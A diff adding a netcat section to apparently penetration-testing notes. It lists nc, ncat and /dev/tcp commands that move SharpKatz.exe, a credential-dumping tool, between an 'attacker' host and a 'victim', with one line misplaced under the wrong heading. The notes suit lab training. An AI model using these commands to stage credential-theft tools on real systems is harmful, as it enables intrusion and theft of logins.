@@ -62,6 +62,26 @@ scp plaintext@192.168.49.128:/root/myroot.txt .
 
 **Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.
 
+## 4) nc tools
+- **attacker**
+```
+## attacker lestin
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+## victim connect
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+
+## OR vicitm lestin
+nc -l -p 8000 > SharpKatz.exe
+ncat -l -p 8000 --recv-only > SharpKatz.exe
+## attacker send
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+
+```
+
 # Upload Operations
 
 ## Web Upload
